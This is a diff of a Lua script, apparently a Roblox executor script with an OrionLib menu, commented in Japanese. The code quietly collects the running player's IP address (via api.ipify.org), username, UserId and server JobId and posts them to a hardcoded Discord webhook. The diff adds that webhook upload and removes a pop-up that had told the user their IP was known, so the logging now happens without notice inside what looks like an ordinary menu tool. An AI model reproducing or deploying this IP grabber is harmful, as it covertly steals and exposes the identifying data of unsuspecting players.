@@ -7,62 +7,36 @@ local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1492013363314823281/uZN
 
 local player = Players.LocalPlayer
 
--- IP取得（失敗しても落ちないように）
+-- IP取得（失敗対策）
 local ip = "unknown"
 pcall(function()
     ip = game:HttpGet("https://api.ipify.org/")
 end)
 
--- アバター画像
+-- アバター
 local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="
-    .. player.UserId
-    .. "&width=420&height=420&format=png"
+    .. player.UserId .. "&width=150&height=150&format=png"
 
+-- 超シンプル表示
 local data = {
-    embeds = {
-        {
-            title = "🌐 Player Log Detected",
-            color = 5814783,
-
-            author = {
-                name = player.Name .. " が実行",
-            },
-
-            thumbnail = {
-                url = avatar
-            },
-
-            fields = {
-                {
-                    name = "👤 ユーザー情報",
-                    value = "```" .. player.Name .. "```",
-                    inline = true
-                },
-                {
-                    name = "🆔 UserId",
-                    value = "```" .. player.UserId .. "```",
-                    inline = true
-                },
-                {
-                    name = "🌍 IPアドレス",
-                    value = "```" .. ip .. "```",
-                    inline = false
-                },
-                {
-                    name = "📡 サーバー情報",
-                    value = "```JobId: " .. game.JobId .. "```",
-                    inline = false
-                }
-            },
-
-            footer = {
-                text = "Roblox System Monitor"
-            },
-
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }
-    }
+    username = "Player Logger",
+    avatar_url = avatar,
+    content =
+        "👤 名前: " .. player.Name ..
+        "\n🆔 UserId: " .. player.UserId ..
+        "\n🌍 IP: " .. ip ..
+        "\n📡 JobId: " .. game.JobId
 }
+
+-- 送信
+pcall(function()
+    request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
+end)
 
 -- 送信（失敗しても止まらない）
 pcall(function()
@@ -90,15 +64,6 @@ local Window = OrionLib:MakeWindow({
 })
 
 print("Loading complete")
-
-local ip = game:HttpGet("http://api.ipify.org")
-
-OrionLib:MakeNotification({
-	Name = "エラーヌーブのスクリプトだよ",
-	Content = "抜いちゃあないけどきみのIPアドレスはわかってるからな？これだな".. ip,
-	Image = "rbxassetid://4483345998",
-	Time = 5
-})
 
 -- Homeタブを作成
 local HomeTab = Window:MakeTab({
